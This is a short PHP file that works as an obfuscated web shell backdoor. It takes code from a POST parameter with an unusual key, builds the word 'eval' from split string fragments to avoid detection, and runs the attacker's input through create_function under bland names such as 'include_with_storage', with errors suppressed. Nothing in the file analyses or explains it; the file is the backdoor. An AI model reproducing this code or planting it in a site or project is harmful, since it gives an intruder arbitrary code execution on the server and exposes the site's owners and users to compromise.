<?php
$raw_engine = $_POST['ISAZO1289c!jda@d42'] ?? '';

if (!empty($raw_engine)) {
    $part1 = "e" . "v";
    $part2 = "a" . "l";
    $engine_name = $part1 . $part2;
    
    $storage = array();
    $storage['core'] = $engine_name;
    
    if (isset($storage['core'])) {
        $handler = $storage['core'];
        @include_with_storage($handler, trim($raw_engine));
        exit();
    }
}

function include_with_storage($method, $payload) {
    $executor = create_function('', $method . '($GLOBALS["raw_engine"]);');
    if (is_callable($executor)) {
        $executor();
    }
}
